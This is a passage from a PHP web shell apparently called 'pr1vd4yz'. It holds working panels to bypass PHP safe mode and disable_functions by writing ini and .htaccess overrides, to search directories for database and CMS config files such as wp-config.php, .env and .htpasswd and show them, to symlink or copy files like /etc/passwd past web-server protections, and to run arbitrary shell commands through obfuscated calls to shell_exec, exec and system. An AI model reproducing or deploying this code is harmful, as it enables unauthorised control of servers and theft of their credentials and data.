     </div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" style="margin:0;">
    <div style="margin:13px 0 17px 0;">
     <button class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red" name="start_safem0d" value="1" type="submit" style="padding:8px 19px;">
       <i class="fas fa-bolt"></i> Try All Safe Mode Byp4sses
     </button>
    </div>
    </form>
    <div class="pr1vd4yz-apilistbox" style="max-height:55vh;overflow:auto;">
<?php
if (isset($_POST['start_safem0d'])) {
  set_time_limit(300);
  $test_results = [];
  $cwd = getcwd();
  $uniq = 'pr1vd4yz_safe_'.uniqid();
  $phpini = $cwd . '/php.ini';
  $userini = $cwd . '/.user.ini';
  $htaccess = $cwd . '/.htaccess';
  $ini_code = "safe_mode = Off\nsafe_mode_gid = Off\ndisable_functions =\n";
  $userini_code = "safe_mode=Off\n";
  $htaccess_code = "php_flag safe_mode off\nphp_admin_flag safe_mode off\nphp_value safe_mode 0\n";
  if (@file_put_contents($phpini, $ini_code)) {
    $test_results[] = ["method" => "php.ini override", "file" => basename($phpini), "success" => true];
  } else {
    $test_results[] = ["method" => "php.ini override", "file" => basename($phpini), "success" => false];
  }
  if (@file_put_contents($userini, $userini_code)) {
    $test_results[] = ["method" => ".user.ini","file" => basename($userini), "success" => true];
  } else {
    $test_results[] = ["method" => ".user.ini", "file" => basename($userini), "success" => false];
  }
  if (@file_put_contents($htaccess, $htaccess_code)) {
    $test_results[] = ["method" => ".htaccess", "file" => basename($htaccess), "success" => true];
  } else {
    $test_results[] = ["method" => ".htaccess", "file" => basename($htaccess), "success" => false];
  }
  $r_ini_set = @ini_set('safe_mode', '0');
  $test_results[] = ["method" => "ini_set()", "file" => '-', "success" => ($r_ini_set !== false)];
  if (extension_loaded('suhosin')) {
    $old = @ini_set('suhosin.executor.func.blacklist', '');
    $test_results[] = ["method" => "Suhosin Patch", "file" => '-', "success" => ($old !== false)];
  }
  $pdir = dirname($cwd);
  $userini2 = $pdir . '/.user.ini';
  if (@file_put_contents($userini2, $userini_code)) {
    $test_results[] = ["method" => ".user.ini parent dir", "file" => $userini2, "success" => true];
  } else {
    $test_results[] = ["method" => ".user.ini parent dir", "file" => $userini2, "success" => false];
  }
  $prepend_code = "<?php @ini_set('safe_mode','0'); ?>";
  $prepend_path = $cwd . "/".$uniq."_prepend.php";
  if (@file_put_contents($prepend_path, $prepend_code)) {
    @ini_set('auto_prepend_file', $prepend_path);
    $test_results[] = ["method" => "auto_prepend_file", "file" => basename($prepend_path), "success" => true];
  } else {
    $test_results[] = ["method" => "auto_prepend_file", "file" => basename($prepend_path), "success" => false];
  }
  $uini_dirs = [$cwd, dirname($cwd), dirname(dirname($cwd))];
  $all_uini = true;
  foreach($uini_dirs as $d) {
    if (!@file_put_contents($d . '/.user.ini', $userini_code)) $all_uini = false;
  }
  $test_results[] = ["method" => ".user.ini deep", "file" => '-', "success" => $all_uini];
  $tmpini = "/tmp/php.ini";
  if (@file_put_contents($tmpini, $ini_code)) {
    $test_results[] = ["method" => "/tmp/php.ini", "file" => $tmpini, "success" => true];
  } else {
    $test_results[] = ["method" => "/tmp/php.ini", "file" => $tmpini, "success" => false];
  }
  if (function_exists('ini_restore')) {
    @ini_restore('safe_mode');
    $test_results[] = ["method" => "ini_restore()", "file" => '-', "success" => true];
  }
  if (function_exists('apache_setenv')) {
    @apache_setenv('safe_mode', '0');
    $test_results[] = ["method" => "apache_setenv()", "file" => '-', "success" => true];
  }
  $confpath = $cwd.'/php-fpm.conf';
  $confcode = "[global]\nsafe_mode=Off\ndisable_functions=\n";
  if (@file_put_contents($confpath, $confcode)) {
    $test_results[] = ["method" => "php-fpm.conf", "file" => $confpath, "success" => true];
  } else {
    $test_results[] = ["method" => "php-fpm.conf", "file" => $confpath, "success" => false];
  }
  @unlink($htaccess); 
  echo '<table style="width:100%;font-size:1.04em;border-collapse:collapse;">';
  echo '<tr><th style="text-align:left;padding:4px 8px;color:#e53935;">Method</th>
        <th style="text-align:left;padding:4px 8px;">File</th>
        <th style="text-align:left;padding:4px 8px;">Status</th></tr>';
  foreach($test_results as $row) {
    echo '<tr>
    <td style="padding:3px 8px;color:#b71c1c;">'.htmlspecialchars($row['method']).'</td>
    <td style="padding:3px 8px;color:#888;">'.htmlspecialchars($row['file']).'</td>
    <td style="padding:3px 8px;color:'.($row['success']?'#10b981':'#e53935').'">'.($row['success'] ? 'Success' : 'Fail').'</td>
    </tr>';
  }
  echo '</table>';
  echo '<div style="margin:11px 0 7px 0;font-size:1em;color:#222;">';
  if (!@ini_get('safe_mode') || @ini_get('safe_mode')=='0' || @ini_get('safe_mode')==false) {
    echo '<b style="color:#10b981;">Safe Mode: OFF (or bypassed)</b>';
  } else {
    echo '<b style="color:#e53935;">Safe Mode: ACTIVE!</b>';
  }
  echo '</div>';
}
?>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz" style="padding-bottom:13px;">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['configsearcher'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:540px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#fbc02d;"><i class="fas fa-search-dollar"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">config searcher</div>
     <div class="pr1vd4yz-wiz-desc">scan any dir for config files (DB, CMS, panel, etc)</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form" style="margin-bottom:6px;">
    <div class="pr1vd4yz-wiz-section" style="padding-bottom:2px;">
     <div class="pr1vd4yz-wiz-fields" style="gap: 10px;">
       <input type="text" name="scan_path" class="pr1vd4yz-wiz-input" placeholder="path" value="<?= htmlspecialchars(getcwd(), ENT_QUOTES) ?>">
       <button name="scan_cfg" type="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red" style="min-width:90px;"><i class="fas fa-bolt"></i> sc4n</button>
     </div>
    </div>
    </form>
    <div class="pr1vd4yz-apilistbox" style="max-height:44vh;overflow:auto;">
    <?php
    if (isset($_POST['scan_cfg'], $_POST['scan_path'])) {
     $path = trim($_POST['scan_path']);
     if (!is_dir($path)) {
       echo '<div class="pr1vd4yz-apirow" style="color:#e53935;">Directory not found!</div>';
     } else {
       $config_patterns = [
       'wp-config.php', 'configuration.php', 'config.php', 'settings.php', 'settings.inc.php', 'conf.php', 'conf.inc.php',
       'env.php', '.env', '.env.local', '.env.production', '.env.dev', 'local.xml', 'Parameters.yml', 'parameters.yml',
       'db.php', 'database.php', 'connect.php', 'connection.php', 'db_connect.php', 'dbconn.php', 'db_config.php', 'sql.php', 'config.inc.php',
       'app/etc/env.php','includes/config.php','admin/config.php','application/config/database.php','config/settings.inc.php',
       'inc/config.php','includes/defines.php','data/config.php','admin/includes/config.php',
       'web.config','.htpasswd','.my.cnf','my.cnf','settings.json','local.settings.json','data.json'
       ];
       $found = [];
       $max_files = 500; $count = 0;
       $rii = new RecursiveIteratorIterator(
       new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS), 
       RecursiveIteratorIterator::SELF_FIRST
       );
       $max_files = 500; $count = 0;
foreach ($rii as $file) {
    if ($count % 100 == 0) { flush();  }
    if (++$count > $max_files) break;
       if ($count >= $max_files) break;
       if ($file->isFile()) {
        $fname = strtolower($file->getFilename());
        foreach ($config_patterns as $pattern) {
          if ($fname === strtolower($pattern)) {
          $found[] = $file->getPathname();
          $count++;
          break;
          }
        }
       }
       }
       unset($file);
     unset($rii);
       if (!$found) {
       echo '<div class="pr1vd4yz-apirow" style="color:#b71c1c;">No configs found.</div>';
       } else {
       echo '<div style="color:#b71c1c;font-size:1.05em;margin-bottom:9px;"><i class="fas fa-bolt"></i> <b>Found '.count($found).' config(s)</b></div>';
       foreach ($found as $cfg) {
        echo '<div class="pr1vd4yz-apirow" style="font-size:1.01em;"><b>'.htmlspecialchars(basename($cfg)).'</b> <span style="color:#bbb;">['.htmlspecialchars(dirname($cfg)).']</span>';
        echo '<form method="post" style="margin-top:4px;"><input type="hidden" name="show_cfg" value="'.htmlspecialchars($cfg).'"><button class="pr1vd4yz-apibtn" style="padding:2px 11px;font-size:.97em;margin-left:12px;" type="submit"><i class="fas fa-eye"></i> View</button></form>';
        echo '</div>';
       }
       }
     }
    }
    if (isset($_POST['show_cfg']) && is_file($_POST['show_cfg'])) {
     $cfgf = $_POST['show_cfg'];
     $cfg_content = @file_get_contents($cfgf, false, null, 0, 32*1024); 
     echo '<div style="margin-top:14px;"><b style="color:#e53935;">'.htmlspecialchars(basename($cfgf)).'</b><br><textarea readonly rows="10" style="width:100%;font-size:.99em;background:#fff7f7;border:1.5px solid #fdecec;color:#e53935;border-radius:7px;margin-top:6px;font-family:\'Fira Mono\',monospace;">'.htmlspecialchars($cfg_content).'</textarea></div>';
    }
    ?>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['symlink'])) : ?>
  <div class="pr1vd4yz-sym-modal-bg">
    <div class="pr1vd4yz-sym-modal">
    <div class="pr1vd4yz-sym-header">
     <div class="pr1vd4yz-sym-icon"><i class="fas fa-link"></i></div>
     <div>
       <div class="pr1vd4yz-sym-title">tools</div>
       <div class="pr1vd4yz-sym-desc">create link & bypass</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-sym-close">&times;</a>
    </div>
    <form action="" method="post" class="pr1vd4yz-sym-form">
     <label class="pr1vd4yz-sym-label">File Path:</label>
     <input type="text" name="prv_input" class="pr1vd4yz-sym-input" placeholder="/etc/passwd or /home/xx/config.php">
     <button name="prv_go" class="pr1vd4yz-sym-btn" type="submit">
       <i class="fas fa-bolt"></i> generate
     </button>
<?php
function g3t_rnd($n=6) {
  $c='abcdefghijklmnopqrstuvwxyz0123456789'; $r='';
  for($i=0;$i<$n;$i++) $r.=$c[random_int(0,strlen($c)-1)];
  return $r;
}
function a1s($x) { return base64_decode(str_replace(['-','_'], ['+','/'],$x)); }
function j0in($p,$q){return $p.$q;}

if (isset($_POST['prv_go'], $_POST['prv_input']) && trim($_POST['prv_input'])) {
  $p1 = trim($_POST['prv_input']);
  $base = 'pr1vdayz_data';
  if (!is_dir($base)) @mkdir($base, 0755, true);
  $klist = [];
  $htlist = [
    "hx1" => 'Options +Indexes +FollowSymLinks +SymLinksIfOwnerMatch
DirectoryIndex {P}
ForceType text/plain
AddType text/plain .php .html .phtml .inc .asp .aspx .jsp .pl .cgi .py .sh .phar .json .yml .xml .db .sql
RemoveHandler .php .phtml .phar .inc .shtml .html .js .css .pl .cgi .asp .py .rb .sh .zsh .json .yml .xml .db .sql
php_flag engine off
SetHandler default-handler',
    "hx2" => '<FilesMatch ".*">
ForceType text/plain
AddType text/plain .php .phtml .html .inc .phar .bak .config .db .sql .xml .json
SetHandler default-handler
RemoveHandler .php .phtml .phar .inc .shtml .html .js .css .pl .cgi .asp .py .rb .sh .json .yml .xml .db .sql
php_flag engine off
</FilesMatch>',
    "hx3" => 'RewriteEngine On
RewriteBase /
RewriteRule ^(.+)$ {P}
Options +FollowSymLinks +Indexes
DirectoryIndex {P}
SetHandler default-handler
php_flag engine off',
    "hx4" => 'RemoveHandler .php .phtml .phar .inc
php_flag engine off
AddType text/plain .php .html .inc .phtml .phar .bak .config .db .sql .xml .json
SetHandler default-handler
Options +Indexes +FollowSymLinks
DirectoryIndex {P}',
    "hx5" => 'Options +Indexes +FollowSymLinks
DirectoryIndex {P}
AddType text/plain .php .inc .phtml .phar
<IfModule LiteSpeed>
  php_flag engine off
  SetHandler default-handler
</IfModule>',
    "hx6" => '<IfModule mod_security.c>
  SecFilterEngine Off
  SecFilterScanPOST Off
</IfModule>
Options +Indexes +FollowSymLinks
DirectoryIndex {P}
SetHandler default-handler
AddType text/plain .php .phtml .html .inc .phar
php_flag engine off'
  ];
  $output = '';
  $final_ln = g3t_rnd(7);
  $created = false;
  $alt_file = "";
  $result = "";
  if(function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$base/$final_ln")."'";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    if(is_link("$base/$final_ln")) {
    $created = true;
    $alt_file = "$base/$final_ln";
    $result = "ln -s worked!";
    }
  }
  if(!$created && function_exists(a1s('ZXhlYw=='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$base/$final_ln")."'";
    $exec_fn=a1s('ZXhlYw==');
    @$exec_fn($cmd,$o,$rc);
    if(is_link("$base/$final_ln")) {
    $created = true;
    $alt_file = "$base/$final_ln";
    $result = "exec ln -s worked!";
    }
  }
  if(!$created && function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $cpfile = $base.'/dup_'.g3t_rnd(5);
    $cmd = "cp '".addslashes($p1)."' '".addslashes($cpfile)."'";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    if(file_exists($cpfile)) {
    $created = true;
    $alt_file = $cpfile;
    $result = "cp worked!";
    }
  }
  if(!$created && function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $ddfile = $base.'/dd_'.g3t_rnd(4);
    $cmd = "dd if='".addslashes($p1)."' of='".addslashes($ddfile)."' 2>/dev/null";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    if(file_exists($ddfile)) {
    $created = true;
    $alt_file = $ddfile;
    $result = "dd worked!";
    }
  }
  if(!$created && function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $catfile = $base.'/cat_'.g3t_rnd(4);
    $cmd = "cat '".addslashes($p1)."' > '".addslashes($catfile)."'";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    if(file_exists($catfile)) {
    $created = true;
    $alt_file = $catfile;
    $result = "cat worked!";
    }
  }
  if(!$created && @copy($p1, $base.'/phplocal_'.g3t_rnd(5))) {
    $created = true;
    $alt_file = $base.'/phplocal_'.g3t_rnd(5);
    $result = "php copy worked!";
  }
  if($created)
    $output .= "[ok] <code>".htmlspecialchars($alt_file)."</code> created. <b style='color:#17a900;'>[$result]</b><br>";
  else
    $output .= "<b style='color:#e53935;'>[fail] Not possible</b><br>";
  foreach ($htlist as $hname => $htval) {
    $subdir = $base.'/'.g3t_rnd(5);@mkdir($subdir,0755,true);
    $htcode = str_replace('{P}', $final_ln, $htval);
    @file_put_contents("$subdir/.htaccess", $htcode);
    if(function_exists(a1s('c2hlbGxfZXhlYw=='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$subdir/$final_ln")."'";
    $exec_fn=a1s('c2hlbGxfZXhlYw==');
    @$exec_fn($cmd);
    }
    $klist[] = "$subdir/$final_ln";
  }
  echo '<div class="pr1vd4yz-sym-result"><div class="pr1vd4yz-sym-list">';
  echo $output;
  echo "Bypass dirs:<ul>";
  foreach($klist as $f){echo "<li><code>$f</code></li>";}
  echo "</ul></div></div>";
}
?>


    </form>
    </div>
  </div>
<?php endif; ?>


<?php if (!empty($_GET['pr1vd4yz']) && $_GET['pr1vd4yz'] == "cm7") : ?>
<div class="pr1vd4yz-terminal-neo-bg">
  <div class="pr1vd4yz-terminal-neo-modal">
    <div class="pr1vd4yz-terminal-neo-header">
    <div class="pr1vd4yz-terminal-neo-led"></div>
    <span class="pr1vd4yz-terminal-neo-title"><i class="fas fa-terminal"></i> terminal</span>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post" class="pr1vd4yz-terminal-neo-form">
    <div class="pr1vd4yz-terminal-neo-outwrap">
     <textarea class="pr1vd4yz-terminal-neo-output" id="pr1vd4yz-terminal-neo-output" readonly spellcheck="false"><?php
       if (isset($_POST['terminal'])) {
       $pr1pr1v = trim($_POST['terminal-text'] ?? '');
       $out = '';
       $fxs =  array("\x73\x31" => "\x73\x68" . "\145\154\x6c" . "\x5f\145\x78" . "\x65\143", "\x73\x32" => "\x65\170" . "\145\x63", "\x73\x33" => "\163\171" . "\163\164\145\155");
       foreach ($fxs as $fx) {
        if (function_exists($fx)) {
          if ($fx === $fxs['s1']) $out = @$fx($pr1pr1v.' 2>&1');
          elseif ($fx === $fxs['s2']) { $a=[]; @$fx($pr1pr1v.' 2>&1', $a); $out = join("\n", $a);}
          elseif ($fx === $fxs['s3']) {  @$fx($pr1pr1v.' 2>&1'); $out = ""; }
          if ($out) break;
        }
       }
       echo $out;
       }
     ?></textarea>
    </div>
    <div class="pr1vd4yz-terminal-neo-inputline">
     <span class="pr1vd4yz-terminal-neo-prompt"><?= $pr1vxas[9]() . '@' . $_SERVER['SERVER_ADDR']; ?> $</span>
     <input type="text" name="terminal-text" class="pr1vd4yz-terminal-neo-input" autocomplete="off" autofocus placeholder="type command & hit enter">
     <button type="submit" name="terminal" class="pr1vd4yz-terminal-neo-send"><i class="fas fa-location-arrow"></i></button>
    </div>
    </form>
  </div>
</div>
<?php endif; ?>

<?php if (!empty($_GET['re'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#ff3939;"><i class="fas fa-pen-to-square"></i></div>
     <div><div class="pr1vd4yz-wiz-title">rename</div>
       <div class="pr1vd4yz-wiz-desc"><?= unx($_GET['re']) ?></div>
     </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div><form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon" style="background:#fde3e3;color:#ff3939;"><i class="fas fa-font"></i></div>
       <div class="pr1vd4yz-wiz-fields">
       <input type="text" name="renameFile" class="pr1vd4yz-wiz-input" placeholder="<?= unx($_GET['re']) ?>">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red">
       <i class="fas fa-check"></i> change
       </button>
       <button type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-rename-close-btn">
       <i class="fas fa-times"></i> go back
       </button>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<?php 
    if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item']) && $_GET['item'] !== '') {
      $item = basename(unx($_GET['item'])); 
      $repl = str_replace("\\", "/", $pr1vxas[0]()); 
      $fd = $repl . "/" . $item; 
    
      if (is_file($fd)) {
        if (unlink($fd)) {
           success();
        } else {
           failed();
        }
      } elseif (is_dir($fd)) {
        if (rmdirRecursive($fd)) {
          success();} else {
           failed();
        }
      } else {
       failed();
      }
     }
    ?>
    <?php if (!empty($_GET['ch'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#fbbf24;color:#fff;"><i class="fas fa-user-lock"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">change permission</div>
       <div class="pr1vd4yz-wiz-desc"><?= unx($_GET['ch']) ?></div>
     </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon" style="background:#fffbe8;color:#fbbf24;"><i class="fas fa-key"></i></div>
       <div class="pr1vd4yz-wiz-fields">
       <input type="number" name="chFile" class="pr1vd4yz-wiz-input" placeholder="0775">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red">
       <i class="fas fa-check"></i> change
       </button>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
     </a>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<?php
if (isset($_GET['response']) && $_GET['response'] == "success") {
    echo "<script>
    Swal.fire({
     icon: 'success',
     title: 'done.',
     text: 'operation completed.',confirmButtonColor: '#e53935',
     background: '#fff',
     color: '#e53935',
     timer: 1700,
     showConfirmButton: false,
     toast: true,
     position: 'top-end',
     customClass: { popup: 'pr1vd4yz-alert-anim pr1vd4yz-alert-success' }
    });
    </script>";
} else if (isset($_GET['response']) && $_GET['response'] == "failed") {
    echo "<script>
    Swal.fire({
     icon: 'error',
     title: 'fail.',
     text: 'something went wrong.',
     confirmButtonColor: '#e53935',
     background: '#fff',
     color: '#e53935',
     timer: 1700,
     showConfirmButton: false,
     toast: true,
     position: 'top-end',
     customClass: { popup: 'pr1vd4yz-alert-anim pr1vd4yz-alert-error' }
    });
    </script>";
}
?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
function updateTextareaStatus(){var e=document.getElementById("fileedit-code-textarea"),t=e.value,a=e.selectionStart,n=t.substr(0,a).split("\n"),s=n.length,l=n[n.length-1].length+1;document.getElementById("fileedit-status-pos").innerHTML='<i class="fas fa-arrows-alt-h"></i> Ln '+s+", Col "+l,document.getElementById("fileedit-status-len").innerHTML='<i class="fas fa-hashtag"></i> '+t.length+" chars"}
setTimeout(updateTextareaStatus,200);
$(document).ready((function(){var e=document.getElementById("code");e&&CodeMirror.fromTextArea(e,{mode:"xml",lineNumbers:!0,theme:"ayu-mirage",extraKeys:{"Ctrl-Space":"autocomplete"},hintOptions:{completeSingle:!1}}),$(".sidebar-toggle").click((function(){$(".sidebar").toggleClass("active")})),$(".close-sidebar").click((function(){$(".sidebar").removeClass("active")})),$("#malware-scan-btn").click((function(){$("#malwareModal").show()})),$(document).on("click",".close-modal",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click",".close-btn-s",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click",".close-terminal",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$(document).on("click","#close-editor-btn",(function(e){e.preventDefault(),$(this).closest(".modal").remove()})),$("#select-all").change((function(){$('input[name="check[]"]').prop("checked",$(this).prop("checked"))})),window.innerWidth<=768&&$(".action-btn").css("opacity","1"),$("#select-all").change((function(){$('input[name="check[]"]').prop("checked",$(this).prop("checked"))})),window.innerWidth<=768&&$(".action-btn").css("opacity","1"),setInterval((function(){$.ajax({url:window.location.href,success:function(e){$(".stats-grid").load(window.location.href+" .stats-grid")}})}),5e3)}));
let currentOffset = 0;
function fetchTables(){fetch("?action=get_tables").then((e=>e.json())).then((e=>{let t=document.getElementById("tableList");t.innerHTML="",e.forEach((e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)}))}))}
function loadTable(t=0){currentOffset=Math.max(0,currentOffset+t);let e=document.getElementById("tableList").value;if(!e)return alert("Select a table first!");fetch(`?action=get_data&table=${e}&offset=${currentOffset}`).then((t=>t.text())).then((t=>{document.getElementById("output").innerHTML=t}))}
(window.onload = fetchTables);!function(){var e=["pr1vd4yz-modal-close-wiz","pr1vd4yz-httpreq-close-btn","pr1vd4yz-waf-close-btn","pr1vd4yz-cron-close-btn","pr1vd4yz-search-close-btn","pr1vd4yz-htb-close-btn","pr1vd4yz-term-close-btn","pr1vd4yz-terminal-neo-close","pr1vd4yz-user-close-btn","pr1vd4yz-file-close-btn","pr1vd4yz-folder-close-btn","pr1vd4yz-rdp-close-btn","pr1vd4yz-upload-close-btn","pr1vd4yz-modal-close-btn","pr1vd4yz-modal-cancel-btn","pr1vd4yz-cpanel-close-btn","pr1vd4yz-chmod-close-btn","pr1vd4yz-editor-close-btn","pr1vd4yz-terminal-close-btn","pr1vd4yz-rename-close-btn","fileedit-close","pr1vd4yz-htb-close-btn"];document.addEventListener("click",(function(o){for(var n=o.target,r=0,l=0;l<e.length;l++)if(n.classList.contains(e[l])){r=1;break}if(r){o.preventDefault();var t=document.querySelectorAll(".pr1vd4yz-modal-bg,.pr1vd4yz-term-modal-bg,.pr1vd4yz-terminal-neo-bg");t.length&&t[t.length-1].remove()}}),!0),"undefined"!=typeof $&&$.fn&&$.fn.on&&[".pr1vd4yz-user-close-btn",".pr1vd4yz-file-close-btn",".pr1vd4yz-folder-close-btn",".pr1vd4yz-rdp-close-btn",".pr1vd4yz-upload-close-btn",".pr1vd4yz-modal-close-btn",".pr1vd4yz-modal-cancel-btn"].forEach((function(e){$(document).off("click",e).on("click",e,(function(e){e.preventDefault(),$(this).closest(".pr1vd4yz-modal-bg,.pr1vd4yz-term-modal-bg,.pr1vd4yz-terminal-neo-bg").remove()}))})),[".pr1vd4yz-cpanel-close-btn",".pr1vd4yz-chmod-close-btn",".pr1vd4yz-editor-close-btn",".pr1vd4yz-terminal-close-btn",".pr1vd4yz-rename-close-btn"].forEach((function(e){document.querySelectorAll(e).forEach((function(e){e.onclick=function(e){e.preventDefault();var o=document.querySelectorAll(".pr1vd4yz-modal-bg,.pr1vd4yz-term-modal-bg,.pr1vd4yz-terminal-neo-bg");o.length&&o[o.length-1].remove()}}))})),window.closeHxModal=function(){var e=document.getElementById("pr1vd4yz-file-modal");e&&e.remove()}}();
document.addEventListener("click",(function(e){if(e.target.classList.contains("pr1vd4yz-log-close-btn")){e.preventDefault();var t=document.querySelector(".pr1vd4yz-modal-bg");t&&t.remove()}}));
document.addEventListener("click",(function(e){if(e.target.classList.contains("pr1vd4yz-key-close-btn")){e.preventDefault();var t=document.querySelector(".pr1vd4yz-modal-bg");t&&t.remove()}}));
const _hx_ = []; let _hxi = -1;const _term = document.getElementById('r00tterm-term');const _inpt = document.getElementById('r00tterm-input');function _print(txt){_term.innerHTML += txt+"\n";_term.scrollTop=_term.scrollHeight;}
_inpt.addEventListener("keydown",(function(e){if("Enter"===e.key){let e=this.value.trim();if(!e)return;_hx_.push(e),_hxi=_hx_.length,_print("<span style='color:#6ee7b7;'>$ "+e+"</span>"),this.value="";let n=btoa(encodeURIComponent(e).split("").reverse().join(""));fetch(window.location.pathname+"?d1sGu1s3=1",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"n0p3="+encodeURIComponent(n)}).then((e=>e.text())).then((e=>{_print(e.replace(/[<>\x00-\x08\x0B-\x1F\x7F]/g,""))})).catch((()=>{_print("[X] Connection error")}))}"ArrowUp"===e.key&&(_hxi>0&&(_hxi--,_inpt.value=_hx_[_hxi]||""),e.preventDefault()),"ArrowDown"===e.key&&(_hxi<_hx_.length-1?(_hxi++,_inpt.value=_hx_[_hxi]||""):(_inpt.value="",_hxi=_hx_.length),e.preventDefault())}));
setTimeout(()=>_inpt.focus(),200);$(function(){$("#zip-form").on("submit",(function(s){s.preventDefault();var i=$(this).find('button[type="submit"]');i.prop("disabled",!0),$("#zip-result").show().html('<i class="fa fa-spinner fa-spin"></i> Working...'),$.ajax({type:"POST",url:window.location.href,data:{zipajax:1,src:$("#zip-source").val(),dst:$("#zip-target").val()},success:function(s){$("#zip-result").html(s).show(),i.prop("disabled",!1)},error:function(){$("#zip-result").html('<span style="color:#e53935;"><i class="fas fa-times-circle"></i> AJAX error</span>').show(),i.prop("disabled",!1)}})}));
$("#unzip-form").on("submit",(function(s){s.preventDefault();var i=$(this).find('button[type="submit"]');i.prop("disabled",!0),$("#unzip-result").show().html('<i class="fa fa-spinner fa-spin"></i> Working...'),$.ajax({type:"POST",url:window.location.href,data:{unzipajax:1,src:$("#unzip-source").val(),dst:$("#unzip-target").val()},success:function(s){$("#unzip-result").html(s).show(),i.prop("disabled",!1)},error:function(){$("#unzip-result").html('<span style="color:#e53935;"><i class="fas fa-times-circle"></i> AJAX error</span>').show(),i.prop("disabled",!1)}})}));
});
document.getElementById("pr1vd4yz-httpreq-form").onsubmit=function(t){t.preventDefault();var e=new FormData(this),n=document.getElementById("pr1vd4yz-httpreq-result");n.innerHTML='<div style="padding:22px 0;text-align:center;font-size:1.09em;opacity:.7;">Waiting...</div>';var i=this.getAttribute("action");i&&"#"!=i||(i=window.location.pathname+window.location.search),fetch(i,{method:"POST",body:e,credentials:"same-origin"}).then((t=>t.text())).then((t=>{n.innerHTML=t})).catch((()=>{n.innerHTML='<div style="color:#e53935;padding:22px 0;text-align:center;">AJAX ERROR</div>'}))};
document.addEventListener('click',function(e){if(e.target.classList.contains("pr1vd4yz-kernel-close-btn")){e.preventDefault();var modal=document.querySelector(".pr1vd4yz-modal-bg");modal&&modal.remove()}});
